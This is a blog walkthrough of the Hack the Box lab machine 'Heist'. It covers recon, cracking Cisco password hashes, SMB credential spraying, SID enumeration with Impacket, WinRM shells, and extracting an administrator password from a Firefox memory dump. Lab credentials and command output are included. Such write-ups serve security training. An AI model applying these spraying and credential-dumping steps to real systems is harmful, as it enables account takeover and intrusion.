---
layout:     post
title:      Hack the Box - Heist
date:       2019-11-30 12:00:00 -0400
summary:    HTB Heist machine walkthrough. Stepping through methodology of what worked, what didn't and any interesting notes gleaned along the way.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - windows
 - winrm
 - smb
 - impacket
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-heist/infocard.PNG' | relative_url }}">
</p>

<p>Heist was an easy difficulty box that combined credential harvesting, spraying, dumping a process to capture further credentials and a final spray to get Administrator access. OVerall it was a good box Windows box with a few fundamentals that could be practiced.</p>

<h1>Initial Recon</h1>

<p>As usual, let's kick it off with an NMAP scan.</p>

{% highlight shell %}
root@kali:~# nmap -sV -sV -p- 10.10.10.149
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 15:26 EDT
Nmap scan report for 10.10.10.149
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds
{% endhighlight %}

<p>SMB did not reveal anything public so let's take a look at the web service running.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/webpage.PNG' | relative_url }}">
</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/burp.PNG' | relative_url }}">
</p>

<p>Looks like there is a guest login option. Let's pop in as guest and see what we can find.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/recon-issues.PNG' | relative_url }}">
</p>

<p>Oooh, an attachment? Don't mind I do!</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/recon-attachment.PNG' | relative_url }}">
</p>

<p>Ok excellent, we're starting our credentials list. Cracking the type-5 and type-7 cisco hashes we now have a list of:</p>

{% highlight shell %}
hazard:stealth1agent
rout3r::0242114B0E143F015F5D1E161713::$uperP@ssword
admin::02375012182C1A1D751618034F36415408::Q4)sJu\Y8qz*A3?d
{% endhighlight %}

<p>The first pairing of <code>hazard/stealth1agent</code> was a guess based on the username in the issues post. I dumped all potential passwords and usernames into corresponding files and used the smb_login module to spray them for validity.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/recon-smbenum2.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Unfortunately at this point Hazard was not able to log in using winrm so took a different angle and tried dumping more information with the valid credentials.</p>

{% highlight python %}
root@kali:~/Desktop/HTB/Heist# python lookupsid2.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

Brute forcing SIDs at 10.10.10.149
Trying protocol 445/SMB...
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
{% endhighlight %}

<p>Great, we have a few more users to add to our user file. Let's re-run the smb_login module with the expanded list now.<p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/recon-smbenum3.PNG' | relative_url }}">
</p>

<p>We have an extra hit, excellent! This time <code>chase</code> was able to leverage winrm and we got ourselves a shell. I went between evil-winrm and the ruby iteration of winrm to try different angles.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/user-evilwinrm.PNG' | relative_url }}">
</p>
<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/user-winrm.PNG' | relative_url }}">
</p>

<p>And now with shell access we are able to get our user flag. User down!</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/user-owned.PNG' | relative_url }}">
</p>

<h1>Root exploitation</h1>

<p>Unfortunately my notes were a little skimp during this part. Checking the <code>login.php</code> code we saw that there was an admin hash listed.</p>

{% highlight php %}
<?php
session_start();
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
                $_SESSION['admin'] = "valid";
                header('Location: issues.php');
        }
        else
                header('Location: errorpage.php');
}
else if( isset($_GET['guest']) ) {
        if( $_GET['guest'] === 'true' ) {
                $_SESSION['guest'] = "valid";
                header('Location: issues.php');
        }
}
?>
{% endhighlight %}

<p>Also checking the todo file in Chase's home directory we can assume he is periodically logging in to check any ongoing issues.</p>

{% highlight shell %}
PS > cat todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
{% endhighlight %}

<p>Armed with this information let's dump the browser's (firefox) process and look any stored passwords in memory. Getting the dump file over to our own host we do a quick check.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Heist# strings firefox.exe_191020_085813.dmp | egrep 'password'
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
{% endhighlight %}

<p>Perfect! Now let's expand our smb_logon files to validate the password.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/root-administratorenum.PNG' | relative_url }}">
</p>

<p>Bam! Let's use our trusty evil-winrm to log on.</p>

<p align="center">
<img width="100%" height="100%" src="{{ '/assets/htb-heist/root-owned.PNG' | relative_url }}">
</p>

<p>There we go! Thanks everyone, until next time!</p>